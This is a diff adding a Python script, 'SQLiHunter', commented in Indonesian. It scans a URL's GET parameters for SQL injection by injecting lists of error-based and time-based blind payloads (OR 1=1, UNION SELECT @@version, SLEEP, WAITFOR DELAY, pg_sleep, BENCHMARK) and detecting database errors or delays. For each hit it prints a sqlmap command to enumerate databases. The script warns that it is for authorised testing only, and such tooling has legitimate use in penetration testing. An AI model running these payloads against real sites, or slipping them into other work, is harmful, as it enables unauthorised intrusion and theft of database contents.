@@ -1,0 +1,362 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import requests
+import time
+import argparse
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+import urllib3
+import statistics # Untuk statistik baseline
+
+# Menonaktifkan peringatan InsecureRequestWarning karena kita menggunakan verify=False
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# --- Payloads ---
+# Payload untuk Error-Based SQL Injection
+error_based_payloads = [
+    "'", "\"", "`", 
+    "OR 1=1", "' OR 1=1", "\" OR 1=1", "` OR 1=1",
+    "' OR '1'='1", "\" OR \"1\"=\"1", "` OR `1`=`1`",
+    "' OR 'x'='x", "\" OR \"x\"=\"x", "` OR `x`=`x`",
+    "UNION SELECT NULL", "' UNION SELECT NULL -- ",
+    "AND 1=0", "' AND 1=0 -- ",
+    "1' ORDER BY 1--+",
+    "1' ORDER BY 99--+", # Untuk menebak jumlah kolom
+    "1' GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0)#", # MySQL error based
+    "1' UNION SELECT @@version--+", # MySQL version
+    "1' UNION SELECT sqlite_version()--+", # SQLite version
+    "1' UNION SELECT NULL,version(),NULL--+", # PostgreSQL version (asumsi 3 kolom)
+    "1' OR 1=1 --",
+    "1' OR 1=1 #",
+    "1' OR 1=1 /*",
+    "1' OR 'a'='a",
+    "1' OR 'a'='a' --",
+    "1' OR 'a'='a' #",
+    "1' OR 'a'='a' /*",
+    "1' OR 1=CONVERT(int,(SELECT @@version))--", # SQL Server
+    "1' OR 1=CAST((SELECT @@version) AS INT)--" # SQL Server
+]
+
+# Pesan error SQL yang umum dicari dalam respons
+sql_error_messages = [
+    "you have an error in your sql syntax", "warning: mysql", "unclosed quotation mark",
+    "syntax error", "sql syntax", "odbc driver", "ora-01756", "ora-", # Oracle
+    "invalid sql statement", "pg_query()", "psqlexception", # PostgreSQL
+    "sqliteexception", "unrecognized token", "near \"'\": syntax error", # SQLite
+    "microsoft ole db provider", "sql server detected", # SQL Server
+    "driver odbc microsoft access", "jet oledb", # MS Access
+    "syntax error (missing operator)" # MS Access
+]
+
+# Template payload untuk Time-Based Blind SQL Injection
+# {delay} akan diganti dengan durasi delay
+# {sleeptimes} untuk BENCHMARK, {randstr} untuk string acak
+time_based_payloads_templates = [
+    "AND SLEEP({delay})", "' AND SLEEP({delay})", "\" AND SLEEP({delay})", "` AND SLEEP({delay})",
+    "OR SLEEP({delay})", "' OR SLEEP({delay})", "\" OR SLEEP({delay})", "` OR SLEEP({delay})",
+    "'; IF (1=1) WAITFOR DELAY '0:0:{delay}'--", # SQL Server
+    "'); IF (1=1) WAITFOR DELAY '0:0:{delay}'--", # SQL Server
+    "pg_sleep({delay})", "' AND pg_sleep({delay}) --", "\" AND pg_sleep({delay}) --", # PostgreSQL
+    "AND BENCHMARK({sleeptimes},MD5('{randstr}'))", # MySQL
+    "' AND BENCHMARK({sleeptimes},MD5('{randstr}')) --", # MySQL
+    "OR IF(1=1,SLEEP({delay}),0)", # MySQL
+    "' OR IF(1=1,SLEEP({delay}),0) --", # MySQL
+]
+
+DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 SQLiHunter/1.1"
+DEFAULT_TIMEOUT = 15 # Detik, dinaikkan dari versi sebelumnya
+BASELINE_SAMPLES = 3 # Jumlah sampel untuk menghitung baseline waktu respons
+NETWORK_TOLERANCE = 1.0 # Toleransi detik untuk fluktuasi jaringan saat cek time-based
+
+def make_request_session(session, url, method="GET", params=None, data=None, headers=None, timeout=DEFAULT_TIMEOUT, allow_redirects=True):
+    """
+    Membuat permintaan HTTP menggunakan objek session.
+    """
+    try:
+        if method.upper() == "GET":
+            response = session.get(url, params=params, headers=headers, timeout=timeout, verify=False, allow_redirects=allow_redirects)
+        # elif method.upper() == "POST": # Belum diimplementasikan sepenuhnya
+        #     response = session.post(url, params=params, data=data, headers=headers, timeout=timeout, verify=False, allow_redirects=allow_redirects)
+        else:
+            print(f"[-] Metode HTTP tidak didukung: {method}")
+            return None
+        return response
+    except requests.exceptions.Timeout:
+        print(f"[-] Permintaan timeout ke {url} ({timeout}s).")
+        return None
+    except requests.exceptions.ConnectionError as e:
+        print(f"[-] Kesalahan koneksi ke {url}: {e}")
+        return None
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Kesalahan permintaan umum: {e}")
+        return None
+
+def check_error_based_sqli(session, base_url_parts, original_params_dict, param_to_test, original_status_code):
+    """
+    Memeriksa kerentanan Error-Based SQL Injection pada parameter tertentu.
+    """
+    print(f"\n[*] Menguji Error-Based SQLi pada parameter: {param_to_test}")
+    
+    for payload_idx, payload in enumerate(error_based_payloads):
+        test_params = original_params_dict.copy()
+        
+        current_param_values = list(test_params.get(param_to_test, ['']))
+        # Jika parameter tidak ada atau list nilainya kosong, atau nilai pertamanya kosong
+        if not current_param_values or not current_param_values[0]:
+            current_param_values = [payload]
+        else:
+            current_param_values[0] = current_param_values[0] + payload # Tambahkan payload ke nilai yang ada
+        test_params[param_to_test] = current_param_values
+        
+        query_string = urlencode(test_params, doseq=True)
+        test_url = urlunparse(base_url_parts._replace(query=query_string))
+
+        # print(f"    -> ({payload_idx+1}/{len(error_based_payloads)}) URL: {test_url[:100]}...") # Debug
+        response = make_request_session(session, test_url)
+
+        if response:
+            # Cek 1: Pesan error SQL dalam konten respons
+            for error_msg in sql_error_messages:
+                if error_msg.lower() in response.text.lower():
+                    print(f"[+] Potensi Error-Based SQLi (Pesan Error) terdeteksi dengan payload: {payload}")
+                    print(f"    URL: {test_url}")
+                    return True, test_url
+
+            # Cek 2: Status code yang mengindikasikan error server (misalnya, 500)
+            if response.status_code != original_status_code and response.status_code >= 500:
+                print(f"[+] Potensi Error-Based SQLi (Status Code: {response.status_code}) terdeteksi dengan payload: {payload}")
+                print(f"    URL: {test_url}")
+                return True, test_url
+
+    print(f"[-] Tidak ada Error-Based SQLi yang jelas terdeteksi pada parameter: {param_to_test}")
+    return False, None
+
+
+def check_time_based_sqli(session, base_url_parts, original_params_dict, param_to_test, delay_seconds=5, threshold_multiplier=0.8):
+    """
+    Memeriksa kerentanan Time-Based Blind SQL Injection pada parameter tertentu.
+    Mengambil beberapa sampel baseline untuk meningkatkan keandalan.
+    """
+    print(f"\n[*] Menguji Time-Based Blind SQLi pada parameter: {param_to_test} (target delay: {delay_seconds}s)")
+    
+    baseline_params = original_params_dict.copy()
+    baseline_query_string = urlencode(baseline_params, doseq=True)
+    baseline_url = urlunparse(base_url_parts._replace(query=baseline_query_string))
+    
+    baseline_durations = []
+    print(f"    Mengambil {BASELINE_SAMPLES} sampel waktu respons baseline...")
+    for i in range(BASELINE_SAMPLES):
+        start_time_baseline = time.time()
+        # Timeout untuk baseline harus cukup, tapi tidak terlalu lama
+        response_baseline = make_request_session(session, baseline_url, timeout=DEFAULT_TIMEOUT) 
+        end_time_baseline = time.time()
+        
+        if response_baseline:
+            duration = end_time_baseline - start_time_baseline
+            baseline_durations.append(duration)
+            print(f"      Sampel {i+1}: {duration:.2f} detik")
+            time.sleep(0.5) # Beri jeda antar sampel baseline
+        else:
+            print(f"[-] Gagal mendapatkan sampel baseline #{i+1} untuk {param_to_test}. Melewati pengujian time-based untuk parameter ini.")
+            return False, None
+
+    if not baseline_durations: # Jika tidak ada sampel baseline yang berhasil
+        return False, None
+
+    avg_baseline_duration = statistics.mean(baseline_durations)
+    # Hitung stdev jika ada lebih dari 1 sampel, jika tidak, beri nilai default kecil
+    stdev_baseline_duration = statistics.stdev(baseline_durations) if len(baseline_durations) > 1 else 0.1
+    print(f"    Waktu respons baseline rata-rata: {avg_baseline_duration:.2f}s (stdev: {stdev_baseline_duration:.2f}s)")
+
+    # Tentukan ambang batas yang lebih dinamis: rata-rata + (delay target * faktor) + toleransi jaringan
+    # Ini membantu memperhitungkan jitter jaringan dan memastikan delay signifikan.
+    dynamic_threshold = avg_baseline_duration + (delay_seconds * threshold_multiplier) + NETWORK_TOLERANCE
+
+    for payload_idx, payload_template in enumerate(time_based_payloads_templates):
+        # Ganti placeholder dalam template payload
+        payload = payload_template.format(delay=delay_seconds, sleeptimes=delay_seconds*500000, randstr='r4nd0mStr')
+        
+        test_params = original_params_dict.copy()
+        current_param_values = list(test_params.get(param_to_test, ['']))
+        if not current_param_values or not current_param_values[0]:
+            current_param_values = [payload]
+        else:
+            current_param_values[0] = current_param_values[0] + payload
+        test_params[param_to_test] = current_param_values
+        
+        query_string = urlencode(test_params, doseq=True)
+        test_url = urlunparse(base_url_parts._replace(query=query_string))
+
+        # Timeout untuk permintaan dengan payload delay harus lebih besar dari delay itu sendiri + toleransi
+        request_timeout = delay_seconds + DEFAULT_TIMEOUT + NETWORK_TOLERANCE
+        
+        start_time_payload = time.time()
+        response_payload = make_request_session(session, test_url, timeout=request_timeout)
+        end_time_payload = time.time()
+        duration_payload = end_time_payload - start_time_payload
+
+        # print(f"    -> ({payload_idx+1}/{len(time_based_payloads_templates)}) URL: {test_url[:100]}, Durasi: {duration_payload:.2f}s") # Debug
+
+        if response_payload: # Jika permintaan berhasil
+            # Kondisi kerentanan: Durasi dengan payload secara signifikan lebih besar dari ambang batas dinamis
+            if duration_payload >= dynamic_threshold:
+                print(f"[+] Potensi Time-Based Blind SQLi terdeteksi dengan payload: {payload}")
+                print(f"    URL: {test_url}")
+                print(f"    Durasi Respons: {duration_payload:.2f}s (Baseline Rata-rata: {avg_baseline_duration:.2f}s, Ambang Batas Dinamis: {dynamic_threshold:.2f}s)")
+                return True, test_url
+    
+    print(f"[-] Tidak ada Time-Based Blind SQLi yang jelas terdeteksi pada parameter: {param_to_test}")
+    return False, None
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="SQLiHunter - Pemeriksa Kerentanan SQL Injection Dasar untuk Parameter GET.",
+        formatter_class=argparse.RawTextHelpFormatter,
+        epilog="""Contoh penggunaan:
+  python script_ini.py "http://testphp.vulnweb.com/listproducts.php?cat=1"
+  python script_ini.py "https://example.com/search?query=test" --delay 7
+
+PERINGATAN KERAS:
+  1. Alat ini TIDAK 100% AKURAT. Banyak faktor bisa menyebabkan false positive/negative.
+  2. Gunakan HANYA untuk tujuan pendidikan & pengujian yang SAH dengan IZIN EKSPLISIT.
+  3. Penggunaan tidak sah adalah ILEGAL. Risiko ditanggung pengguna.
+  4. WAJIB lakukan verifikasi manual dan gunakan alat profesional (SQLMap) untuk konfirmasi.
+"""
+    )
+    parser.add_argument("url", help="URL target untuk diuji (misalnya, 'http://example.com/page?id=1')")
+    parser.add_argument("--delay", type=int, default=5, help="Delay (detik) untuk pengujian time-based blind SQLi (default: 5)")
+    parser.add_argument("--user-agent", type=str, default=DEFAULT_USER_AGENT, help=f"User-Agent untuk permintaan HTTP (default: SQLiHunter/1.1)")
+    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help=f"Timeout umum untuk permintaan HTTP (detik) (default: {DEFAULT_TIMEOUT})")
+
+    args = parser.parse_args()
+    target_url = args.url
+    time_delay_seconds = args.delay
+    
+    global DEFAULT_TIMEOUT # Update timeout global jika dispesifikasikan dari argumen
+    DEFAULT_TIMEOUT = args.timeout
+    
+    # Menggunakan banner dari artefak
+    print("""
+********************************************************************
+* SQLiHunter v1.1                              *
+* Basic SQL Injection Vulnerability Probe (GET Params)      *
+* *
+* !! PERINGATAN: HANYA UNTUK TUJUAN EDUKASI & SAH !!        *
+********************************************************************
+""")
+    print("\nPERINGATAN SANGAT PENTING:")
+    print("ALAT INI TIDAK MENJAMIN AKURASI 100%. HASILNYA HANYA INDIKASI AWAL!")
+    print("KESALAHAN DETEKSI (FALSE POSITIVE/NEGATIVE) SANGAT MUNGKIN TERJADI.")
+    print("SELALU LAKUKAN VERIFIKASI MANUAL DAN GUNAKAN ALAT YANG LEBIH KOMPREHENSIF.")
+    print("GUNAKAN DENGAN BIJAK DAN HANYA PADA SISTEM YANG ANDA MILIKI IZIN UNTUK MENGUJINYA.\n")
+
+    print(f"[*] Memulai pemindaian pada: {target_url}")
+    print(f"[*] User-Agent: {args.user_agent}")
+    print(f"[*] Timeout Permintaan Umum: {DEFAULT_TIMEOUT} detik")
+    print(f"[*] Delay untuk Time-Based SQLi: {time_delay_seconds} detik")
+
+
+    parsed_url = urlparse(target_url)
+    if not parsed_url.scheme or not parsed_url.netloc:
+        print("[-] URL tidak valid. Harap sertakan skema (http atau https) dan nama host.")
+        return
+
+    query_params_str = parsed_url.query
+    if not query_params_str:
+        print("[-] Tidak ada parameter GET yang ditemukan di URL. Alat ini hanya menguji parameter GET.")
+        return
+
+    original_params_dict = parse_qs(query_params_str, keep_blank_values=True)
+    if not original_params_dict:
+        print("[-] Tidak ada parameter GET yang dapat diurai dari URL.")
+        return
+        
+    print(f"[*] Parameter GET yang terdeteksi: {list(original_params_dict.keys())}")
+
+    session = requests.Session()
+    session.headers.update({"User-Agent": args.user_agent}) # Gunakan user-agent dari argumen
+    
+    print("[*] Mendapatkan respons baseline dari URL asli...")
+    initial_response = make_request_session(session, target_url, timeout=DEFAULT_TIMEOUT + 5) # Beri sedikit tambahan timeout untuk request awal
+    if not initial_response:
+        print("[-] Gagal mendapatkan respons awal dari target. Tidak dapat melanjutkan.")
+        return
+    
+    original_status_code = initial_response.status_code
+    print(f"    Status baseline: {original_status_code}, Panjang Konten: {len(initial_response.content)} bytes")
+
+    vulnerabilities_found = []
+
+    for param_name in list(original_params_dict.keys()): 
+        print(f"\n--- Menguji Parameter: {param_name} ---")
+        
+        is_error_vulnerable, error_vuln_url = check_error_based_sqli(
+            session, parsed_url, original_params_dict.copy(), param_name, original_status_code
+        )
+        if is_error_vulnerable:
+            vulnerabilities_found.append({
+                "type": "Error-Based SQLi",
+                "url_test": error_vuln_url,
+                "parameter": param_name,
+                "original_url": target_url
+            })
+
+        is_time_vulnerable, time_vuln_url = check_time_based_sqli(
+            session, parsed_url, original_params_dict.copy(), param_name, delay_seconds=time_delay_seconds
+        )
+        if is_time_vulnerable:
+            # Cek agar tidak duplikat jika sudah terdeteksi sebagai error-based pada parameter yang sama
+            # (meskipun time-based bisa jadi konfirmasi tambahan)
+            is_already_error_based = any(
+                v['parameter'] == param_name and v['type'] == "Error-Based SQLi" 
+                for v in vulnerabilities_found
+            )
+            # Tambahkan jika belum ada atau jika ingin tetap melaporkan time-based meskipun error-based ada
+            # Untuk sekarang, kita laporkan keduanya jika terdeteksi.
+            vulnerabilities_found.append({
+                "type": "Time-Based Blind SQLi",
+                "url_test": time_vuln_url,
+                "parameter": param_name,
+                "original_url": target_url
+            })
+    
+    print("\n" + "="*60)
+    print("              [*] Ringkasan Pemindaian Selesai [*]")
+    print("="*60)
+
+    if vulnerabilities_found:
+        print("\n[!!!] POTENSI KERENTANAN SQL INJECTION DITEMUKAN [!!!]")
+        # Menghilangkan duplikasi jika parameter dan tipe sama persis
+        unique_vulns_for_reporting = []
+        seen_vulns = set()
+        for vuln in vulnerabilities_found:
+            vuln_tuple = (vuln['parameter'], vuln['type'])
+            if vuln_tuple not in seen_vulns:
+                unique_vulns_for_reporting.append(vuln)
+                seen_vulns.add(vuln_tuple)
+
+        for vuln_idx, vuln in enumerate(unique_vulns_for_reporting):
+            print(f"\n--- Potensi Kerentanan #{vuln_idx+1} ---")
+            print(f"  [-] Tipe        : {vuln['type']}")
+            print(f"  [-] Parameter   : {vuln['parameter']}")
+            print(f"  [-] URL Uji     : {vuln['url_test']}")
+            
+            # Membuat URL yang disarankan untuk sqlmap dengan parameter yang ditandai
+            # Ini lebih baik daripada menandai URL uji, karena URL uji sudah dimodifikasi
+            sqlmap_target_url_for_param = vuln['original_url']
+            
+            print(f"  [*] Saran Eksploitasi dengan SQLMap:")
+            print(f"      sqlmap -u \"{sqlmap_target_url_for_param}\" -p \"{vuln['parameter']}\" --batch --dbs --level=3 --risk=3")
+            print(f"      (Opsi -p \"{vuln['parameter']}\" akan fokus pada parameter yang terindikasi rentan.)")
+            print(f"      (Anda mungkin perlu menyesuaikan --user-agent, --headers, atau --cookie jika diperlukan.)")
+            print(f"  [*] INGAT: WAJIB verifikasi temuan ini dengan sqlmap atau secara manual!")
+            
+    else:
+        print("[-] Tidak ada indikasi kerentanan SQL Injection yang jelas terdeteksi dengan metode dasar ini.")
+        print("[-] PERHATIAN: Ini BUKAN berarti situs 100% aman dari SQL Injection! Lakukan pengujian lebih lanjut.")
+
+    print("\n[*] Pemindaian selesai. JANGAN PERNAH LUPA UNTUK MEMVERIFIKASI SEMUA HASIL SECARA MANUAL!")
+    print("[*] Keakuratan alat ini terbatas. Gunakan dengan bijak.")
+
+if __name__ == "__main__":
+    main()
